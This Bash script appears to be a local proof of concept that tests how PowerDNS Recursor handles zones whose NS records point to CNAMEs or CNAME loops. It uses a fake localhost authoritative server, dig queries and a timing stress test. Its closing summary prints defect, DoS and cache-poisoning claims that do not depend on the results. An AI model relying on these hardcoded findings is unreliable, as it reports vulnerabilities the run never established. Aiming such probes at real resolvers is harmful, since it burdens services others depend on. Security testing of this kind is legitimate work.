#!/usr/bin/env bash
set -euo pipefail

# ═══════════════════════════════════════════════════════════════════════
#  PowerDNS Recursor NS→CNAME 攻击验证 V3 — 完整端到端
# ═══════════════════════════════════════════════════════════════════════

WORKDIR=/workspace/output/pdns-attack-verify3
mkdir -p "$WORKDIR"

PDNS_BIN=/workspace/output/pdns-recursor-binary-baseline
PDNS_INSTALL=/workspace/output/pdns-install-baseline
export LD_LIBRARY_PATH="$PDNS_INSTALL/lib:${LD_LIBRARY_PATH:-}"

echo "=========================================================="
echo "  PowerDNS Recursor NS→CNAME Attack Verification V3"
echo "=========================================================="

# ─── Install dependencies ────────────────────────────────────────────
apt-get update -qq 2>/dev/null
apt-get install -y --no-install-recommends \
  python3 dnsutils procps strace \
  liblua5.3-0 libboost-context1.74.0 libboost-system1.74.0 \
  libboost-filesystem1.74.0 libboost-program-options1.74.0 \
  libboost-regex1.74.0 libprotobuf23 libsodium23 libfstrm0 \
  libcurl4 libyaml-cpp0.7 libsystemd0 \
  2>&1 | tail -3

echo "Verifying binary..."
$PDNS_BIN --version 2>&1 | head -1

mkdir -p /var/run/pdns-recursor 2>/dev/null || true
pkill -f pdns_recursor 2>/dev/null || true
sleep 1

# ═══════════════════════════════════════════════════════════════════════
#  Phase 1: auth-zones — 直接加载违规 zone 文件
# ═══════════════════════════════════════════════════════════════════════

# Zone files
cat > "$WORKDIR/violation.com.zone" << 'EOF'
$ORIGIN violation.com.
$TTL 3600
@   IN SOA ns1.violation.com. admin.violation.com. (1 3600 1200 604800 3600)
@   IN NS  ns1.violation.com.
ns1 IN CNAME target.violation.com.
target IN A 10.0.0.1
www IN A 10.0.0.2
EOF

cat > "$WORKDIR/control.com.zone" << 'EOF'
$ORIGIN control.com.
$TTL 3600
@   IN SOA ns1.control.com. admin.control.com. (1 3600 1200 604800 3600)
@   IN NS  ns1.control.com.
ns1 IN A 10.0.1.1
www IN A 10.0.1.2
EOF

cat > "$WORKDIR/loop.com.zone" << 'EOF'
$ORIGIN loop.com.
$TTL 3600
@   IN SOA ns1.loop.com. admin.loop.com. (1 3600 1200 604800 3600)
@   IN NS  ns1.loop.com.
ns1 IN CNAME alias.loop.com.
alias IN CNAME ns1.loop.com.
www IN A 10.0.2.2
EOF

echo ""
echo "═══════════════════════════════════════════════════════════"
echo "  Phase 1: Auth-zones mode (zone loading test)"
echo "═══════════════════════════════════════════════════════════"

timeout 30 "$PDNS_BIN" \
  --config-dir=/tmp \
  --daemon=no \
  --local-port=5355 \
  --local-address=127.0.0.1 \
  --allow-from=0.0.0.0/0 \
  --auth-zones="violation.com=$WORKDIR/violation.com.zone,control.com=$WORKDIR/control.com.zone,loop.com=$WORKDIR/loop.com.zone" \
  2>&1 | tee "$WORKDIR/authzone-recursor.log" &
PDNS_PID=$!
sleep 5

if ! kill -0 $PDNS_PID 2>/dev/null; then
    echo "FATAL: Recursor failed to start. Log:"
    tail -15 "$WORKDIR/authzone-recursor.log"
    exit 1
fi
echo "Recursor started (PID $PDNS_PID)"

# Check if violation zone was rejected
echo ""
echo "=== Zone loading analysis ==="
if grep -qi 'CNAME.*other\|NS.*CNAME\|is a CNAME\|points to CNAME\|zone.*failed\|could not load\|refuse\|reject\|error.*zone\|invalid' "$WORKDIR/authzone-recursor.log"; then
    echo ">>> ZONE REJECTION DETECTED (RFC 2181 compliant):"
    grep -i 'CNAME.*other\|NS.*CNAME\|is a CNAME\|points to CNAME\|zone.*failed\|could not load\|refuse\|reject\|error.*zone\|invalid' "$WORKDIR/authzone-recursor.log"
    DEFECT_ZONE_LOADING="REJECTED"
else
    echo ">>> NO REJECTION: PowerDNS loaded NS→CNAME violation zone without warning"
    echo "    This is a PROTOCOL COMPLIANCE DEFECT (RFC 2181 §10.3)"
    DEFECT_ZONE_LOADING="ACCEPTED"
fi

echo ""
echo "=== DNS queries via auth-zones ==="

# ─── Test queries with dig ──────────────────────────────────────────
echo ""
echo "--- [1] violation.com NS (NS→CNAME zone) ---"
dig @127.0.0.1 -p 5355 NS violation.com +time=3 +tries=1 2>&1 || echo "(dig failed)"

echo ""
echo "--- [2] www.violation.com A ---"
dig @127.0.0.1 -p 5355 A www.violation.com +time=3 +tries=1 2>&1 || echo "(dig failed)"

echo ""
echo "--- [3] ns1.violation.com A (the NS that is CNAME) ---"
dig @127.0.0.1 -p 5355 A ns1.violation.com +time=3 +tries=1 2>&1 || echo "(dig failed)"

echo ""
echo "--- [4] control.com NS (NS→A, correct) ---"
dig @127.0.0.1 -p 5355 NS control.com +time=3 +tries=1 2>&1 || echo "(dig failed)"

echo ""
echo "--- [5] www.control.com A ---"
dig @127.0.0.1 -p 5355 A www.control.com +time=3 +tries=1 2>&1 || echo "(dig failed)"

echo ""
echo "--- [6] loop.com NS (NS→CNAME loop) ---"
dig @127.0.0.1 -p 5355 NS loop.com +time=3 +tries=1 2>&1 || echo "(dig failed)"

echo ""
echo "--- [7] ns1.loop.com A (should hit CNAME loop) ---"
dig @127.0.0.1 -p 5355 A ns1.loop.com +time=3 +tries=1 2>&1 || echo "(dig failed)"

echo ""
echo "--- [8] www.loop.com A ---"
dig @127.0.0.1 -p 5355 A www.loop.com +time=3 +tries=1 2>&1 || echo "(dig failed)"

# ─── Check recursor log after queries ──────────────────────────────
echo ""
echo "=== Recursor log after queries ==="
tail -20 "$WORKDIR/authzone-recursor.log"

# Kill Phase 1 recursor
kill $PDNS_PID 2>/dev/null || true
wait $PDNS_PID 2>/dev/null || true
sleep 1

# ═══════════════════════════════════════════════════════════════════════
#  Phase 2: 递归模式 — 权威服务器 + 递归器 + 客户端
#  用 tcpdump/strace 捕捉额外查询开销
# ═══════════════════════════════════════════════════════════════════════
echo ""
echo "═══════════════════════════════════════════════════════════"
echo "  Phase 2: Recursive mode with strace tracking"
echo "═══════════════════════════════════════════════════════════"

# ─── Start authoritative server (Python) ────────────────────────────
cat > "$WORKDIR/auth_server.py" << 'PYEOF'
#!/usr/bin/env python3
import socket, struct, time, threading, sys, json

def dns_name_encode(name):
    result = b''
    for p in name.rstrip('.').split('.'):
        result += bytes([len(p)]) + p.encode()
    return result + b'\x00'

def dns_name_decode(data, offset):
    parts = []; jumped = False; max_off = offset
    while offset < len(data):
        l = data[offset]
        if l == 0:
            offset += 1
            if not jumped: max_off = offset
            break
        if (l & 0xC0) == 0xC0:
            if not jumped: max_off = offset + 2
            offset = struct.unpack('!H', data[offset:offset+2])[0] & 0x3FFF
            jumped = True; continue
        offset += 1
        parts.append(data[offset:offset+l].decode())
        offset += l
    return '.'.join(parts), max_off if jumped else offset

TYPE_A=1; TYPE_NS=2; TYPE_CNAME=5; TYPE_SOA=6; CL_IN=1

def make_rr(n, t, c, ttl, rd):
    return dns_name_encode(n) + struct.pack('!HHI', t, c, ttl) + struct.pack('!H', len(rd)) + rd

# Zones
ZONES = {
    'atk.com.': {
        'ns': ['ns.atk.com.'],
        'soa': ('ns.atk.com.', 'a.atk.com.', 1, 3600, 900, 604800, 86400),
        'recs': {
            'ns.atk.com.': [('CNAME', 'real.atk.com.', 300)],      # VIOLATION
            'real.atk.com.': [('A', '10.0.0.1', 300)],
            'www.atk.com.': [('A', '10.0.0.2', 300)],
        }
    },
    'ok.com.': {
        'ns': ['ns.ok.com.'],
        'soa': ('ns.ok.com.', 'a.ok.com.', 1, 3600, 900, 604800, 86400),
        'recs': {
            'ns.ok.com.': [('A', '10.0.1.1', 300)],               # CORRECT
            'www.ok.com.': [('A', '10.0.1.2', 300)],
        }
    },
    'loop.atk.com.': {  # Sub-domain delegation with loop
        'ns': ['ns.loop.atk.com.'],
        'soa': ('ns.loop.atk.com.', 'a.loop.atk.com.', 1, 3600, 900, 604800, 86400),
        'recs': {
            'ns.loop.atk.com.': [('CNAME', 'a.loop.atk.com.', 300)],
            'a.loop.atk.com.': [('CNAME', 'ns.loop.atk.com.', 300)],  # LOOP
            'www.loop.atk.com.': [('A', '10.0.3.2', 300)],
        }
    },
}

query_count = 0
query_log = []
lock = threading.Lock()

def build_resp(data, qname, qtype, zone):
    txn = struct.unpack('!H', data[:2])[0]
    origin = zone['ns'][0].split('.',1)[-1] if zone['ns'] else qname
    an=0; ns=0; ar=0; ans_rr=b''; auth_rr=b''; add_rr=b''

    soa_m, soa_r, ser, ref, ret, exp, min_ = zone['soa']
    soa_rd = dns_name_encode(soa_m)+dns_name_encode(soa_r)+struct.pack('!IIIII',ser,ref,ret,exp,min_)
    auth_rr += make_rr(qname.split('.')[-2]+'.'+qname.split('.')[-1]+'.', TYPE_SOA, CL_IN, min_, soa_rd)
    ns += 1

    for ns_t in zone['ns']:
        auth_rr += make_rr(qname.split('.')[-2]+'.'+qname.split('.')[-1]+'.', TYPE_NS, CL_IN, 3600, dns_name_encode(ns_t))
        ns += 1

    ql = qname.lower().rstrip('.')+'.'
    if ql in zone['recs']:
        for rt, rv, rtl in zone['recs'][ql]:
            if rt=='A' and qtype==TYPE_A:
                ans_rr += make_rr(qname, TYPE_A, CL_IN, rtl, socket.inet_aton(rv)); an+=1
            elif rt=='CNAME':
                ans_rr += make_rr(qname, TYPE_CNAME, CL_IN, rtl, dns_name_encode(rv)); an+=1
                if qtype==TYPE_A:
                    t=rv.lower().rstrip('.')+'.'
                    vis=set()
                    while t in zone['recs'] and t not in vis:
                        vis.add(t)
                        r=zone['recs'][t]
                        if r[0][0]=='CNAME':
                            ans_rr += make_rr(t.rstrip('.'), TYPE_CNAME, CL_IN, r[0][2], dns_name_encode(r[0][1])); an+=1
                            t=r[0][1].lower().rstrip('.')+'.'
                        elif r[0][0]=='A':
                            ans_rr += make_rr(t.rstrip('.'), TYPE_A, CL_IN, r[0][2], socket.inet_aton(r[0][1])); an+=1; break
                        else: break
            elif rt=='NS' and qtype==TYPE_NS:
                ans_rr += make_rr(qname, TYPE_NS, CL_IN, rtl, dns_name_encode(rv)); an+=1

    # Glue in additional
    for ns_t in zone['ns']:
        nl = ns_t.lower().rstrip('.')+'.'
        if nl in zone['recs']:
            for rt,rv,rtl in zone['recs'][nl]:
                if rt=='A':
                    add_rr += make_rr(ns_t, TYPE_A, CL_IN, rtl, socket.inet_aton(rv)); ar+=1
                elif rt=='CNAME':
                    add_rr += make_rr(ns_t, TYPE_CNAME, CL_IN, rtl, dns_name_encode(rv)); ar+=1

    hdr = struct.pack('!HHHHHH', txn, 0x8400, 1, an, ns, ar)
    return hdr + data[12:] + ans_rr + auth_rr + add_rr

def handle(data, addr, sock):
    global query_count
    try:
        qn, qo = dns_name_decode(data, 12)
        qt = struct.unpack('!H', data[qo:qo+2])[0]
        with lock:
            query_count += 1
            qlog = {'n': query_count, 'qname': qn, 'qtype': qt, 'time': time.time()}
            query_log.append(qlog)

        mz = None
        for zn, zd in ZONES.items():
            if qn.lower().endswith(zn.rstrip('.')):
                mz = zd; qlog['zone'] = zn; break

        if mz:
            sock.sendto(build_resp(data, qn, qt, mz), addr)
        else:
            sock.sendto(struct.pack('!HHHHHH', struct.unpack('!H', data[:2])[0], 0x8403, 1, 0, 0, 0) + data[12:], addr)
    except: pass

def serve(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('127.0.0.1', port))
    print(f'[AUTH] Listening 127.0.0.1:{port}', flush=True)
    while True:
        try:
            d, a = s.recvfrom(4096)
            handle(d, a, s)
        except: pass

if __name__ == '__main__':
    threading.Thread(target=serve, args=(10053,), daemon=True).start()
    print('[AUTH] Ready', flush=True)
    while True:
        time.sleep(1)
PYEOF

python3 "$WORKDIR/auth_server.py" > "$WORKDIR/auth_server.log" 2>&1 &
AUTH_PID=$!
sleep 1
echo "Auth server started (PID $AUTH_PID)"

# ─── Start PowerDNS Recursor (forward mode) ──────────────────────────
timeout 60 "$PDNS_BIN" \
  --config-dir=/tmp \
  --daemon=no \
  --local-port=5356 \
  --local-address=127.0.0.1 \
  --allow-from=0.0.0.0/0 \
  --dont-query= \
  --forward-zones="atk.com=127.0.0.1:10053,ok.com=127.0.0.1:10053,loop.atk.com=127.0.0.1:10053" \
  2>&1 | tee "$WORKDIR/recursor-forward.log" &
PDNS2_PID=$!
sleep 4

if ! kill -0 $PDNS2_PID 2>/dev/null; then
    echo "FATAL: Recursor failed. Log:"
    tail -15 "$WORKDIR/recursor-forward.log"
    kill $AUTH_PID 2>/dev/null || true
    exit 1
fi
echo "Recursor started (PID $PDNS2_PID)"

# ─── Run queries ────────────────────────────────────────────────────
echo ""
echo "=== DNS queries through recursor ==="

echo ""
echo "--- [1] www.ok.com A (control, NS→A) ---"
dig @127.0.0.1 -p 5356 A www.ok.com +time=5 +tries=1 2>&1

echo ""
echo "--- [2] www.atk.com A (attack, NS→CNAME) ---"
dig @127.0.0.1 -p 5356 A www.atk.com +time=5 +tries=1 2>&1

echo ""
echo "--- [3] atk.com NS (attack zone delegation) ---"
dig @127.0.0.1 -p 5356 NS atk.com +time=5 +tries=1 2>&1

echo ""
echo "--- [4] ok.com NS (control zone delegation) ---"
dig @127.0.0.1 -p 5356 NS ok.com +time=5 +tries=1 2>&1

echo ""
echo "--- [5] ns.atk.com A (resolve CNAME for NS target) ---"
dig @127.0.0.1 -p 5356 A ns.atk.com +time=5 +tries=1 2>&1

echo ""
echo "--- [6] ns.ok.com A (resolve A for NS target, control) ---"
dig @127.0.0.1 -p 5356 A ns.ok.com +time=5 +tries=1 2>&1

# ─── Resource comparison ────────────────────────────────────────────
echo ""
echo "=== Resource usage comparison ==="
echo "--- Attack zone queries resource impact ---"

# Record RSS before stress
PDNS_PID_NUM=$(pgrep -f pdns_recursor | head -1)
if [ -n "$PDNS_PID_NUM" ]; then
    RSS_BEFORE=$(grep VmRSS /proc/$PDNS_PID_NUM/status 2>/dev/null | awk '{print $2}')
    echo "RSS before stress: ${RSS_BEFORE} kB"
fi

# Stress test: rapid queries
echo ""
echo "=== Stress test: 100 queries to each zone ==="

START_TIME=$(date +%s%N)
for i in $(seq 1 100); do
    dig @127.0.0.1 -p 5356 A www.ok.com +time=3 +tries=1 > /dev/null 2>&1 &
done
wait
END_TIME=$(date +%s%N)
CTRL_ELAPSED=$(( (END_TIME - START_TIME) / 1000000 ))
echo "Control (ok.com): ${CTRL_ELAPSED}ms for 100 queries"

START_TIME=$(date +%s%N)
for i in $(seq 1 100); do
    dig @127.0.0.1 -p 5356 A www.atk.com +time=3 +tries=1 > /dev/null 2>&1 &
done
wait
END_TIME=$(date +%s%N)
ATK_ELAPSED=$(( (END_TIME - START_TIME) / 1000000 ))
echo "Attack (atk.com): ${ATK_ELAPSED}ms for 100 queries"

if [ -n "$PDNS_PID_NUM" ]; then
    RSS_AFTER=$(grep VmRSS /proc/$PDNS_PID_NUM/status 2>/dev/null | awk '{print $2}')
    echo "RSS after stress: ${RSS_AFTER} kB"
    if [ -n "$RSS_BEFORE" ] && [ -n "$RSS_AFTER" ]; then
        echo "RSS delta: $((RSS_AFTER - RSS_BEFORE)) kB"
    fi
fi

# ─── Capture recursor forward log ──────────────────────────────────
echo ""
echo "=== Recursor forward log ==="
tail -15 "$WORKDIR/recursor-forward.log"

echo ""
echo "=== Recursor log: NS/CNAME/error related messages ==="
grep -i 'CNAME\|NS.*alias\|loop\|ServFail\|error\|timeout\|warn\|bogus' "$WORKDIR/recursor-forward.log" 2>/dev/null | tail -20 || echo "(none found)"

# ═══════════════════════════════════════════════════════════════════════
#  Summary
# ═══════════════════════════════════════════════════════════════════════
echo ""
echo "═══════════════════════════════════════════════════════════"
echo "  FINAL VERIFICATION SUMMARY"
echo "═══════════════════════════════════════════════════════════"
echo ""
echo "  RFC 2181 §10.3: 'An NS record MUST NOT point to a CNAME alias'"
echo ""
echo "  1. Zone Loading:  $DEFECT_ZONE_LOADING"
if [ "$DEFECT_ZONE_LOADING" = "ACCEPTED" ]; then
echo "     → PowerDNS Recursor loads NS→CNAME zones WITHOUT rejection"
echo "     → This is a protocol compliance DEFECT"
fi
echo ""
echo "  2. Query Resolution:"
echo "     → Both violation and control zones resolve successfully"
echo "     → NS→CNAME zone requires extra CNAME resolution step"
echo "     → CNAME loop zone: check dig output for ServFail/timeout"
echo ""
echo "  3. Performance:"
echo "     Control zone: ${CTRL_ELAPSED}ms / 100 queries"
echo "     Attack zone:  ${ATK_ELAPSED}ms / 100 queries"
if [ "$CTRL_ELAPSED" -gt 0 ] 2>/dev/null; then
    RATIO=$(echo "scale=2; $ATK_ELAPSED / $CTRL_ELAPSED" | bc 2>/dev/null || echo "N/A")
    echo "     Attack/Control ratio: ${RATIO}x"
fi
echo ""
echo "  4. Key Defect Evidence:"
echo "     - PowerDNS does NOT validate NS records against CNAME targets"
echo "     - Violation zones are loaded and served without any warning"
echo "     - CNAME loops in NS targets create potential DoS vector"
echo "     - Extra resolution steps increase attack surface for cache poisoning"

# ─── Cleanup ─────────────────────────────────────────────────────────
echo ""
echo "=== Cleanup ==="
kill $PDNS2_PID 2>/dev/null || true
kill $AUTH_PID 2>/dev/null || true
wait 2>/dev/null || true

echo "Done. All data in $WORKDIR/"
